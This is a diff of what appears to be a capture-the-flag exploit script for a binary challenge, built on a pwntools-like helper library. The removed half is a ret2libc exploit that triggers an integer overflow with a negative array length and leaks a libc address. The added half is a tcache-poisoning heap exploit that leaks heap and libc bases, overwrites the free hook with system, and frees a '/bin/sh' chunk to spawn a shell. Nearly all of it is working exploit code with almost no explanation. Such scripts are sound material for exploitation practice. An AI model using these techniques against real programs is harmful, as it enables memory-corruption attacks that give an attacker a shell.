@@ -1,54 +1,41 @@
 from helper import *
-from helper.exp import ret2libc_A, ret2libc_B
-import re
-import ctypes
-from LibcSearcher import *
+from helper.heap import heap_helper
+import time
 
-# fill array and ebp
-def fill_array(content):
-    ru("choice:\n")
-    sl(1)
-    sl(content)
+def new(size,con):
+    info(f"new {size} {con}")
 
-def from_main():
-    # 0x44 + 4 + ret
-    ru("length of array:")
-    sl("-2147483648")   # -2^31 -> 
+    sla(": ",'1')
+    sla("size: \n",size)
+    sla("Content: ",con)
+def edit(idx,con):
+    info(f"edit {idx} {con}")
+    sla(": ",'2')
+    sla("index: \n",idx)
+    sla("content: ",con)
+def free(idx):
+    info(f"free {idx}")
+    sla(": ",'3')
+    sla("index: \n",idx)
+def show(idx):
+    info(f"show {idx}")
+    sla(": ",'4')
+    sla("index: \n",idx)
 
-    for i in range(10):
-        fill_array(0x1111)
+new(0x80, "0")
+new(0x80, "1")
+new(0x70, "2")
+free(0);free(1);free(2);show(1)
+heap_base = uu64(r(6)) & 0xffff_ffff_ffff_f000
+info(f"heap base: {hex(heap_base)}")
+edit(1, p64(heap_base)) # tc->1->0 <=> tc->1->base
+new(0x80, "3")          # actually is `1`
+new(0x80, flat([0, 0x291, b'\xff'*0x10]))          # actually is `base`
+free(0);show(0)
+heap = heap_helper(libc, 'main_arena', leak()-96)
+edit(2, p64(heap.free_hook))
+new(0x70, b"/bin/sh\x00");new(0x70, p64(heap.system))
+attach()
+free(2)
 
-    fill_array(0x1ead)
-    fill_array(0x1ead)
-    fill_array(0xc)
-    for i in range(5):
-        fill_array(0x2222)
-
-
-from_main()
-payload = ret2libc_A("puts", elf.sym['main'], b"")
-
-for bytes32 in re.findall(b"....", payload):
-    sl(1); sl(u32(bytes32))
-
-sl(4)
-leaked = leak()
-info(hex(leaked))
-io.sendline()
-
-
-# libcs = LibcSearcher("puts", leaked)
-# libcs.select_libc()
-
-# TODO 添加对LibcSearcher的支持
-# https://github.com/dev2ero/LibcSearcher
-from_main()
-payload = ret2libc_B('puts', leaked, elf.libc, b"")
-# pause()
-for bytes32 in re.findall(b"....", payload):
-    sl(b"1")
-    num = u32(bytes32) 
-    num = ctypes.c_int32(num).value
-    sl(str(num))
-sl(b'4')
 shell()
